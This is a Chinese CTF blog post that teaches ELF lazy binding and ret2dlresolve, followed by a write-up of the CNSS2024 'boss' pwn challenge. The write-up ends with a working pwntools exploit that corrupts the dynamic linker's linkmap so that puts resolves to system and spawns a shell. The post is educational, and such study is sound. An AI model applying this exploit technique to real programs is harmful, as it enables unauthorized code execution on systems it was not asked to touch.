---
layout: post
title: "ret2resolve学习 + CNSS2024 pwn boss wp"
date:   2024-10-2
tags: [CTF, pwn]
comments: true
author: 久菜合子
---


#### 参考资料：
实例文件为boss题的attachment
https://zhuanlan.zhihu.com/p/37572651
https://ctf-wiki.org/executable/elf/structure/basic-info/
https://deepunk.icu/dl%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/
https://www.soinside.com/question/AENBEApAgMMbfzPviVeoBc

### 动态链接程序的装载
##### &emsp;&emsp;&emsp;当程序使用动态链接时，才会存在延迟绑定技术。<br>&emsp;&emsp;&emsp;一个动态链接的程序，除了要将程序本身加载进内存之外，还需要加载对应使用的libc，这一步由ld动态链接器实现。<br>&emsp;&emsp;&emsp;由于动态链接信息与程序的形成和加载由莫大关系，所以在linux系统下，这些信息必须在二进制文件中明确写出，而不是存放在某个PATH中。
```sh
首先，我们来关注一下链接视图。

文件开始处是 ELF 头部（ ELF Header），它给出了整个文件的组织情况。

如果程序头部表（Program Header Table）存在的话，它会告诉系统如何创建进程。用于生成进程的目标文件必须具有程序头部表，但是重定位文件不需要这个表。

节区部分包含在链接视图中要使用的大部分信息：指令、数据、符号表、重定位信息等等。

节区头部表（Section Header Table）包含了描述文件节区的信息，每个节区在表中都有一个表项，会给出节区名称、节区大小等信息。用于链接的目标文件必须有节区头部表，其它目标文件则无所谓，可以有，也可以没有。

```
***来自CTFwiki***
##### &emsp;&emsp;&emsp;这里谈及的是Linking View（链接视图），也就是程序没有加载时的结构，Header table中有关链接的信息在装载时被读取，作为构建Executing View（执行视图）的依据。如下，IDA也读取到了这些信息。
```sh
LOAD:0000000000000000
LOAD:0000000000000000 ; File Name   : C:\Users\30336\Desktop\pwn
LOAD:0000000000000000 ; Format      : ELF64 for x86-64 (Shared object)
LOAD:0000000000000000 ; Interpreter '/lib64/ld-linux-x86-64.so.2'
LOAD:0000000000000000 ; Needed Library 'libc.so.6'
```
##### &emsp;&emsp;&emsp;不难发现，即使是在桌面中的文件，IDA依然可以正确读取Interpreter的位置，因为这些信息已经写死在二进制文件中。<br>&emsp;&emsp;&emsp;常用的工具```patchelf```也是通过直接修改文件达成Interpreter和libc的更换。
### 延迟绑定系统
##### &emsp;&emsp;&emsp;对于动态链接库的使用，主要关注点在于外部函数的使用<br>&emsp;&emsp;&emsp;当程序和库被装载在内存之后，.text段的指令就可以通过```call```来实现对外部函数的调用，对于内部的函数```call```指令相当于是```push```和```jmp```，然后到达对应地址之后开始压栈、执行等。而```call```外部函数时，对应地址是另外一条```jmp```，它会跳转到该函数的```plt```的位置。<br>&emsp;&emsp;&emsp;如果这个外部函数已经被调用过至少一次，那么```plt```处第二次跳转会到达该函数的```got```表项的位置，这个```got```表项又是另一个```jmp```指令，这次终于到达了外部函数的真正地址，然后开始压栈、执行。这是外部函数大多数情况下的调用过程。<br>
##### &emsp;&emsp;&emsp;众所周知，我们在打```ret2libc```时，需要先泄露出libc中某一个函数在内存中的真实地址，然后根据已知的偏移找到我们需要的东西，即使是```-no-pie```也是一样。所以说由于种种原因，即使程序本身的地址可以通过静态分析获得确切地址，也无法预先找到libc的加载地址。<br>&emsp;&emsp;&emsp;那么问题来了，由于```.text```肯定是没法跟着libc加载地址一起变化的，那么在使用外部函数时，怎样才能保证外部函数地址的正确呢？这就是第一次调用外部函数时需要解决的，也就是对外部函数进行重定位. <br>
##### &emsp;&emsp;&emsp;首先解决一个疑惑，为什么是在第一次调用时才重定位呢？实际上，不一定是第一次调用才重定位，也可能在```main()```之前就被处理好了，但在具体实现（尤其是有大量外部函数的调用时）上，还是第一次调用时重定位居多。很简单，因为重定位是一个比较消耗时间的过程，而有些函数（比如异常时结束进程的```exit()```）很可能根本就用不上，所以就延迟绑定（lazy load），没ddl绝不干活。<br>
##### &emsp;&emsp;&emsp;由于延迟绑定的存在，所以之前所说的```got```表那一内存页在完成所有重定位之前，一直都要保持可写。这就是```got```表篡改这一漏洞的实现逻辑，既在所有重定位完成之前篡改一个或多个```got```表项。这个办法在```partial RELRO```和```no RELRO```时可用，在```full RELRO```时，函数被提前重定位，然后内存页变成只读，就没办法改了。<br> 

### 延迟绑定 detail
##### &emsp;&emsp;&emsp;先来一个一个demo，这个是最原始纯真的延迟绑定，后面会来一个带```-fcf-protection=none```的demo。
```c
#include <stdio.h>
int main(){
    char *s = "what a day!";
    puts(s);
    return 0;
}
gcc lazy_load.c -z lazy -no-pie -fcf-protection=none -o lazy_load
```
##### &emsp;&emsp;&emsp; 在```main()```中第一次调用```puts()```，可以看到是```puts@plt```
```c
► 0x401140 <main+26>    call   puts@plt                    <puts@plt>
```
##### &emsp;&emsp;&emsp; 然后进去看看
```c
   0x401030 <puts@plt>: jmp    QWORD PTR [rip+0x2fe2]        # 0x404018 <puts@got.plt>
   0x401036 <puts@plt+6>:       push   0x0
   0x40103b <puts@plt+11>:      jmp    0x401020
```
##### &emsp;&emsp;&emsp; 再到```puts@got.plt```看一眼，这一块有些不知所云，网上收集的资料倒是比较容易，一致的说法是，这里是存放的是```puts@plt + 6```的指令，也就是又跳转回去，到了下面的```0x401036```的位置。
```c
 0x404018 <puts@got.plt>:     ss adc BYTE PTR [rax+0x0],al
   0x40401c <puts@got.plt+4>:   add    BYTE PTR [rax],al
   0x40401e <puts@got.plt+6>:   add    BYTE PTR [rax],al
```
##### &emsp;&emsp;&emsp;再回来，```+6```位置```push```一个```0x0```到栈上，然后又跳
```c
   0x401036 <puts@plt+6>:       push   0x0
   0x40103b <puts@plt+11>:      jmp    0x401020
```
##### &emsp;&emsp;&emsp;不难看到，这块儿正好在```puts@plt```上，具体来说是它在plt头部，所以也叫plt[0]<br>&emsp;&emsp;&emsp;又向栈上```push```，然后```jmp```到```0x404010```
```c
   0x401020:    push   QWORD PTR [rip+0x2fe2]        # 0x404008
   0x401026:    jmp    QWORD PTR [rip+0x2fe4]        # 0x404010
   0x40102c:    nop    DWORD PTR [rax+0x0]
   0x401030 <puts@plt>: jmp    QWORD PTR [rip+0x2fe2]        # 0x404018 <puts@got.plt>
```
##### &emsp;&emsp;&emsp;```0x404010```是一个函数的地址，这个函数就是```_dl_runtime_resolve()```，用于运行时进行外部函数重定位，而刚才的两次```push```，是为该函数提供了参数，第一个```push```的是```rel_arg```，是一个偏移值，第二个是```link_map```结构体。<br>


```c
0x404008:       0x00007ffff7ffe2e0      0x00007ffff7fd8d30 # linkmap # _dl_runtime_resolve
pwndbg> x/10gx 0x00007ffff7fd8d30
0x7ffff7fd8d30 <_dl_runtime_resolve_xsavec>:    0xe3894853fa1e0ff3      0x4d252b48c0e48348
0x7ffff7fd8d40 <_dl_runtime_resolve_xsavec+16>: 0x482404894800023f      0x2454894808244c89
0x7ffff7fd8d50 <_dl_runtime_resolve_xsavec+32>: 0x8948182474894810      0x282444894c20247c
0x7ffff7fd8d60 <_dl_runtime_resolve_xsavec+48>: 0x00eeb830244c894c      0x24948948d2310000
0x7ffff7fd8d70 <_dl_runtime_resolve_xsavec+64>: 0x2494894800000250      0x2494894800000258
```

##### &emsp;&emsp;&emsp;需要注意的是，无论是32还是64位都是这一套模式，64位在这里不会用寄存器传递这两个参数。

### _dl_runtime_resolve()如何重定位
##### &emsp;&emsp;&emsp;在具体讨论之前，补充一些关于Segment的东西<br>
##### &emsp;&emsp;&emsp;.dynamic，存储很多关于动态链接的信息的结构体（ELF64_Dyn），结构体内包含的是信息的种类以及地址。
```c
LOAD:0000000000403E20 ; ELF Dynamic Information
LOAD:0000000000403E20 ; ===========================================================================
LOAD:0000000000403E20
LOAD:0000000000403E20 ; Segment type: Pure data
LOAD:0000000000403E20 ; Segment permissions: Read/Write
LOAD:0000000000403E20 LOAD            segment mempage public 'DATA' use64
LOAD:0000000000403E20                 assume cs:LOAD
LOAD:0000000000403E20                 ;org 403E20h
LOAD:0000000000403E20 _DYNAMIC        Elf64_Dyn <1, 18h>      ; DATA XREF: LOAD:00000000004001A0↑o
LOAD:0000000000403E20                                         ; .got.plt:_GLOBAL_OFFSET_TABLE_↓o
LOAD:0000000000403E20                                         ; DT_NEEDED libc.so.6
LOAD:0000000000403E30                 Elf64_Dyn <0Ch, 401000h> ; DT_INIT
LOAD:0000000000403E40                 Elf64_Dyn <0Dh, 40114Ch> ; DT_FINI
LOAD:0000000000403E50                 Elf64_Dyn <19h, 403E10h> ; DT_INIT_ARRAY
LOAD:0000000000403E60                 Elf64_Dyn <1Bh, 8>      ; DT_INIT_ARRAYSZ
LOAD:0000000000403E70                 Elf64_Dyn <1Ah, 403E18h> ; DT_FINI_ARRAY
LOAD:0000000000403E80                 Elf64_Dyn <1Ch, 8>      ; DT_FINI_ARRAYSZ
LOAD:0000000000403E90                 Elf64_Dyn <6FFFFEF5h, 4003A0h> ; DT_GNU_HASH
LOAD:0000000000403EA0                 Elf64_Dyn <5, 400420h>  ; DT_STRTAB
LOAD:0000000000403EB0                 Elf64_Dyn <6, 4003C0h>  ; DT_SYMTAB
LOAD:0000000000403EC0                 Elf64_Dyn <0Ah, 48h>    ; DT_STRSZ
LOAD:0000000000403ED0                 Elf64_Dyn <0Bh, 18h>    ; DT_SYMENT
LOAD:0000000000403EE0                 Elf64_Dyn <15h, 0>      ; DT_DEBUG
LOAD:0000000000403EF0                 Elf64_Dyn <3, 404000h>  ; DT_PLTGOT
LOAD:0000000000403F00                 Elf64_Dyn <2, 18h>      ; DT_PLTRELSZ
LOAD:0000000000403F10                 Elf64_Dyn <14h, 7>      ; DT_PLTREL
LOAD:0000000000403F20                 Elf64_Dyn <17h, 4004D0h> ; DT_JMPREL
LOAD:0000000000403F30                 Elf64_Dyn <7, 4004A0h>  ; DT_RELA
LOAD:0000000000403F40                 Elf64_Dyn <8, 30h>      ; DT_RELASZ
LOAD:0000000000403F50                 Elf64_Dyn <9, 18h>      ; DT_RELAENT
LOAD:0000000000403F60                 Elf64_Dyn <6FFFFFFEh, 400470h> ; DT_VERNEED
LOAD:0000000000403F70                 Elf64_Dyn <6FFFFFFFh, 1> ; DT_VERNEEDNUM
LOAD:0000000000403F80                 Elf64_Dyn <6FFFFFF0h, 400468h> ; DT_VERSYM
LOAD:0000000000403F90                 Elf64_Dyn <0>           ; DT_NULL
```

##### &emsp;&emsp;&emsp;注意关注（来自deepunk.icu）<br>&emsp;&emsp;&emsp;DT_REL 动态链接重定位表地址<br>&emsp;&emsp;&emsp;DT_SYMTAB 动态链接符号表地址<br>&emsp;&emsp;&emsp;DT_STRTAB 动态链接字符串表地址<br>&emsp;&emsp;&emsp;DT_INIT 初始化代码地址<br>&emsp;&emsp;&emsp;DT_FINI 结束代码地址<br>

##### &emsp;&emsp;&emsp;.dynstr，动态链接中的字符串，可以从上面的结构体可以寻址。可以看到我们使用的```puts()```<br>&emsp;&emsp;&emsp;我们主要关注函数名字符串，比如说在```no RELRO```时，可以篡改```.dynamic```中指向该段结构的地址指向提前伪造好的```.dynstr```，然后触发某函数的重定位，这个函数就被重定位到了伪造段中包含的```system```字样。```partial RELRO ``` 或者 ```full RELRO```时，这段内存不可写，这种方法就使用不了。
```c
LOAD:0000000000400420 ; ELF String Table
LOAD:0000000000400420 unk_400420      db    0                 ; DATA XREF: LOAD:00000000004003D8↑o
LOAD:0000000000400420                                         ; LOAD:00000000004003F0↑o ...
LOAD:0000000000400421 aLibcStartMain  db '__libc_start_main',0
LOAD:0000000000400421                                         ; DATA XREF: LOAD:00000000004003D8↑o
LOAD:0000000000400433 aPuts           db 'puts',0             ; DATA XREF: LOAD:00000000004003F0↑o
LOAD:0000000000400438 aLibcSo6        db 'libc.so.6',0        ; DATA XREF: LOAD:0000000000400470↓o
LOAD:0000000000400442 aGlibc225       db 'GLIBC_2.2.5',0      ; DATA XREF: LOAD:0000000000400480↓o
LOAD:000000000040044E aGlibc234       db 'GLIBC_2.34',0       ; DATA XREF: LOAD:0000000000400490↓o
LOAD:0000000000400459 aGmonStart      db '__gmon_start__',0   ; DATA XREF: LOAD:0000000000400408↑o
```
##### &emsp;&emsp;&emsp;.dynsym，这里是一堆符号表结构体，还是主要关注函数的结构体
```c
LOAD:00000000004003C0 ; ELF Symbol Table
LOAD:00000000004003C0                 Elf64_Sym <0>
LOAD:00000000004003D8                 Elf64_Sym <offset aLibcStartMain - offset unk_400420, 12h, 0, 0, 0, 0> ; "__libc_start_main"
LOAD:00000000004003F0                 Elf64_Sym <offset aPuts - offset unk_400420, 12h, 0, 0, 0, 0> ; "puts"
LOAD:0000000000400408                 Elf64_Sym <offset aGmonStart - offset unk_400420, 20h, 0, 0, 0, 0> ; "__gmon_start__"
```
```c
typedef struct
{
	Elf64_Word st_name; /* 存的是.dynstr 中的偏移值 */
	unsigned char st_info; /* 对于导入函数符号而言，它是0x12 */
	unsigned char st_other; 
	Elf64_Section st_shndx; 
	Elf64_Addr st_value; 
	Elf64_Xword st_size; 
} Elf64_Sym;
// 对于函数来说，3、4、5、6都是0
```
##### &emsp;&emsp;&emsp;.rel.dyn（DT_RELA）和.rel.plt（DT_JMPREL），被称为```动态链接重定位表```<br>&emsp;&emsp;&emsp;.rel.dyn,用于修正```.data```和```.got```中的数据引用，函数的信息不在这里，一般也不是很关注这个<br>&emsp;&emsp;&emsp;.rel.plt这个段和之前的```rel_arg```直接相关，并且用于修正```.got.plt```（俗称的got表）。在32位中```rel_arg```是用于计算它的偏移，64位里直接就是下标（deepunk.icu）；
```c
LOAD:00000000004004A0 ; ELF RELA Relocation Table
LOAD:00000000004004A0                 Elf64_Rela <403FF0h, 100000006h, 0> ; R_X86_64_GLOB_DAT __libc_start_main
LOAD:00000000004004B8                 Elf64_Rela <403FF8h, 300000006h, 0> ; R_X86_64_GLOB_DAT __gmon_start__

LOAD:00000000004004D0 ; ELF JMPREL Relocation Table
LOAD:00000000004004D0                 Elf64_Rela <404018h, 200000007h, 0> ; R_X86_64_JUMP_SLOT puts
LOAD:00000000004004D0 LOAD            ends
```
##### &emsp;&emsp;&emsp;64位和32位的结构体不一样，结构体示例对比一下。（deepunk.icu）<br>&emsp;&emsp;&emsp;
```c
typedef struct
{
	Elf32_Addr r_offset; /* Address */
	Elf32_Word r_info; /* Relocation type and symbol index */
} Elf32_Rel;

typedef struct
{
	Elf64_Addr r_offset; /* Address */
	Elf64_Xword r_info; /* Relocation type and symbol index */
} Elf64_Rel;
```
##### &emsp;&emsp;&emsp;```rel_arg```了解之后，再来解决一下上面遗留的```link_map```结构体。可以看到存储的是被链接的文件，以及它们对应的```.dynamic```以及加载地址偏移（由于```-no-pie```所以执行文件加载地址是```0x0```）,之前```push```的是执行文件的linkmap，也就是第一个
```c
Node           Objfile                                         Load Bias      Dynamic Segment 
0x7ffff7ffe2e0 <Unknown, likely /home/pwn/testtable/lazy_load> 0x0            0x403e20        
0x7ffff7ffe890 linux-vdso.so.1                                 0x7ffff7fc1000 0x7ffff7fc13a0  
0x7ffff7fbb160 /lib/x86_64-linux-gnu/libc.so.6                 0x7ffff7d83000 0x7ffff7f9cbc0  
0x7ffff7ffdaf0 /lib64/ld-linux-x86-64.so.2                     0x7ffff7fc3000 0x7ffff7ffce80 
```
##### &emsp;&emsp;&emsp;以其中的libc.so.6为例，看看```.dynamic```的结构，与执行文件对比一下。
```c
pwndbg> x/20gx 0x7ffff7f9cbc0
0x7ffff7f9cbc0: 0x0000000000000001      0x0000000000007d69
0x7ffff7f9cbd0: 0x000000000000000e      0x0000000000007d7e
0x7ffff7f9cbe0: 0x0000000000000019      0x0000000000216900
0x7ffff7f9cbf0: 0x000000000000001b      0x0000000000000010
0x7ffff7f9cc00: 0x0000000000000004      0x00007ffff7f939f8
0x7ffff7f9cc10: 0x000000006ffffef5      0x00007ffff7d833c8
0x7ffff7f9cc20: 0x0000000000000005      0x00007ffff7d99650
0x7ffff7f9cc30: 0x0000000000000006      0x00007ffff7d87ad0
0x7ffff7f9cc40: 0x000000000000000a      0x0000000000007f15
0x7ffff7f9cc50: 0x000000000000000b      0x0000000000000018
pwndbg> x/20gx  0x403e20
0x403e20:       0x0000000000000001      0x0000000000000018
0x403e30:       0x000000000000000c      0x0000000000401000
0x403e40:       0x000000000000000d      0x000000000040114c
0x403e50:       0x0000000000000019      0x0000000000403e10
0x403e60:       0x000000000000001b      0x0000000000000008
0x403e70:       0x000000000000001a      0x0000000000403e18
0x403e80:       0x000000000000001c      0x0000000000000008
0x403e90:       0x000000006ffffef5      0x00000000004003a0
0x403ea0:       0x0000000000000005      0x0000000000400420
0x403eb0:       0x0000000000000006      0x00000000004003c0
```
##### &emsp;&emsp;&emsp;可以看到两个链接文件的ELF64_Dyn的类型基本一致，说明两个文件的有关动态链接的结构相似的，后面所指向的诸如```.dynstr```、```.dynsym```、```.rel.plt```地址是不一样的，是各自的真实地址。

##### &emsp;&emsp;&emsp;现在简单解释（感性的理解）```_dl_runtime_reslove(link_map, rel_arg)```是如何借助这些结构重定位某一个函数。<br>&emsp;&emsp;&emsp;第一步，借助```link_map```找到```.dynamic```的加载地址，进而找到```.rel.plt```的位置。<br>&emsp;&emsp;&emsp;第二步，借助```rel_arg```（作为偏移或者下标），找到的```.rel.plt```中指定函数的```动态链接重定位表```。<br>&emsp;&emsp;&emsp;第三步，取出```动态链接重定位表```中的```r_offset```，用于找到```.got.plt```的位置（既got表）<br>&emsp;&emsp;&emsp;第四步，取出```动态链接重定位表```中的```r_info```，找到函数的```动态链接重定位表```，取出其中的```st_name```，既```.dynstr```中的函数名字符。

### 一点补充（有关-fcf-protection）
##### &emsp;&emsp;&emsp;这是ubuntu的gcc默认开启的一项保护措施，在第一次函数调用时，不会按照上面的流程，而是直接到glibc中，详情参考https://www.soinside.com/question/AENBEApAgMMbfzPviVeoBc

### 攻击手段
##### &emsp;&emsp;&emsp;现在来具体分析一下这道boss题怎么做。由于给出了source code所以我们自己编译一个方便调试的执行文件，并且把随机数那一部分去掉，指令和上面那个demo一样<br>
```c
[*] '/home/pwn/worktable/cnss2024/boss/src/attachment'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO   <---------
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
```
##### &emsp;&emsp;&emsp;首先来到```init()```函数，```passwd```指向一个```mmap()```出来的空间，```passwd```本身在```.bss```的最高位置。然后在这个空间中写入随机数，最后把前八位换成固定的```deadbeef```字符串，这样总共就有0x10个已写入字符。
```c
void init(){
    setvbuf(stdin, 0LL, 2, 0LL);
    setvbuf(stdout, 0LL, 2, 0LL);
    int fd = open("/dev/urandom", 0);
    if(fd < 0){
        _Exit(0);
    }
    passwd = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE , MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    read(fd, passwd, 0x10);
    memcpy(passwd, "deadbeef", 0x8);
    close(fd);
    return;
}
```
##### &emsp;&emsp;&emsp;动态调试一下，发现多划分了0x2000的长度。<br>
```c
pwndbg> x/10gx 0x4040A0 
0x4040a0 <passwd>:      0x00007ffff7fb9000      0x0000000000000000
0x4040b0:       0x0000000000000000      0x0000000000000000
0x4040c0:       0x0000000000000000      0x0000000000000000
0x4040d0:       0x0000000000000000      0x0000000000000000
0x4040e0:       0x0000000000000000      0x0000000000000000
pwndbg> vmmap
0x7ffff7fb9000     0x7ffff7fbd000 rw-p     4000      0 [anon_7ffff7fb9]
```
##### &emsp;&emsp;&emsp;再查看一下linkmap的地址，

##### &emsp;&emsp;&emsp;再看看```main()```，```read_num()```就是```atoll()```。<br>
```c
int main(){
    unsigned long long offset, value;
    char buf[0x10];
    init();

    myread(buf, 0x10);
    do{
        offset = read_num();
        value = read_num();
        *((unsigned long long *)passwd + offset) ^= value;
    }while(!strncmp(passwd, buf, 0x10));
    
    puts(passwd);
    _Exit(0);
}
```
##### &emsp;&emsp;&emsp;大致内容比较明确，从passwd开始的位置可以8字节一组任意写，前提是知道原本那个地址的内容是什么。<br>&emsp;&emsp;&emsp;这道题比较难回显，所以考虑ret2dlresolve。想法是，由于```puts()```在最后才会第一次调用，也就是那时会调用一次```__dl_runtime_resolve```来重定位```puts```.<br>&emsp;&emsp;&emsp;另外的，由于无法控制压栈的内容，所以解释```puts```时的```rel_arg```和```linkmap```不能变，所以放弃伪造```linkmap```。<br>&emsp;&emsp;&emsp;由于mmap的空间在ld内存的低位，而且偏移不变，所以可以尝试修改到ld的内容，改变linkmap内的内容，实现误导```__dl_runtime_resolve```。
##### &emsp;&emsp;&emsp;首先查看一下linkmap的地址，发现都在ld内，重点修改的是执行文件的linkmap
```c
pwndbg> linkmap
Node           Objfile                                                            Load Bias      Dynamic Segment 
0x7ffff7ffe2e0 <Unknown, likely /home/pwn/worktable/cnss2024/boss/src/attachment> 0x555555554000 0x555555557df8  
0x7ffff7ffe890 linux-vdso.so.1                                                    0x7ffff7fc1000 0x7ffff7fc13a0  
0x7ffff7fbb160 /lib/x86_64-linux-gnu/libc.so.6                                    0x7ffff7d83000 0x7ffff7f9cbc0  
0x7ffff7ffdaf0 /lib64/ld-linux-x86-64.so.2                                        0x7ffff7fc3000 0x7ffff7ffce80  
```
##### &emsp;&emsp;&emsp;思路是，重定向时```__dl_runtime_resolve```会借助```.dynstr```中的字符串，在libc的linkmap中查找目标字符串的偏移，这个偏移+libc基址 被写到.got.plt中。所以这里实际上有两种方法，第一种方法，伪造一个.dynstr，使重定位查找到的不是```puts```，而是```system```；第二种方法，修改linkmap中libc的基地址，使.got.plt中被写入我们指定的函数。<br>&emsp;&emsp;&emsp;博主的方法是第一种方法，并且使用docker容器作为环境，但是这种方法在docker容器中直接运行可以getshell，docker容器把attachment挂到端口上打远程时就不行，推测是直接运行的文件的内存布局和挂在端口上的不一样，尝试爆破出两者的偏移结果也没用。
##### &emsp;&emsp;&emsp;exp.py仅供参考，更具体的思路是将linkmap中的```l->info[DT_STRTAB]```修改最后一位(LSB)，变为```l->info[DT_DEBUG]```的地址，DT_DEBUG结构体的地址成员指向的是ld.so中的一段可读写内存，所以在这个位置的0x3e（puts字符串在.dynstr中的偏移）偏移处伪造一个```system\x00```字样，0x3e偏移处正好全是```\x00```，方便了工作。
```python
from pwn import *
from os import system
def debug(cmd=''):
    system("gdb --pi={}".format(io.pid))
    #system("gdb -q -ex 'target remote localhost:8000'")
    pause()
def key(sh, crypto): # 目标比特串，原本的比特串
    key = ''
    ret = 0
    length = len(sh)
    for i in range(length):
        temp = chr(sh[i] ^ crypto[i])
        key += temp
    for i in range(length):
        ret += pow(256, i) * ord(key[i])
    return ret

def xorsend(offset, payload):
    io.sendline(offset)
    sleep(0.01)
    io.sendline(payload)
    sleep(0.01)

# io = remote("152.136.11.155",10039)
io = remote("localhost", 8000)
# io = process("./boss/src/attachment")
context.log_level = "debug"
io.send(b'sh\x00'.ljust(16, b'\x00'))
# passwd头部改成'sh\0'，绕过strncmp()
xorsend(str(0), str(key(b'sh\x00', b'dea')))
# print(io.recvline())
# 修改l->info[DT_STRTAB]的LSB，指向l->info[DT_DEBUG]
of = 0x1000*(-6)
offset1 = (0x7ffff7ffe348 - 0x7ffff7fb9000 + of) // 8 # 0x45348 0x4a348
xorsend(str(offset1), str(key(b'\xb8', b'\x78')))
# 在0x3e处开始伪造system\x00字样
offset2 = (0x7ffff7ffe118 - 0x7ffff7fb9000 + of) // 8 # 0x45118 0x4a118
xorsend(str(offset2 + 7), str(key(b'\x73\x79'.rjust(8, b'\x00'), b'\x00'*8)))

xorsend(str(offset2 + 8), str(key(b'\x73\x74\x65\x6d'.ljust(8, b'\x00'), b'\x00'*8)))
'''
0x7f1e1f0f1148: 0x0000000000000000      0x7379000000000000
0x7f1e1f0f1158: 0x000000007374656d      0x0000000000000000
'''
# 再把开头处改成'/bin/sh\0'，跳出循环
xorsend(str(0), str(key(b'/bin/sh\x00', b'sh\x00dbeef')))
io.interactive()
```
##### &emsp;&emsp;&emsp;第二种方法是出题人迪普朋克提示的，但没有想到怎么实现，```puts```和```system()```在libc中的偏移有16进制下的五位之多，由于无法泄露libc基址，异或最多修改三位，所以不知道具体怎么写。

##### &emsp;&emsp;&emsp;补：几天之后打通了远程，发现是nc远程启动的进程和docker容器内本地启动的进程内存布局不一样，```mmap()```分配的空间的位置不一样，把上面exp的地址改一下就可以。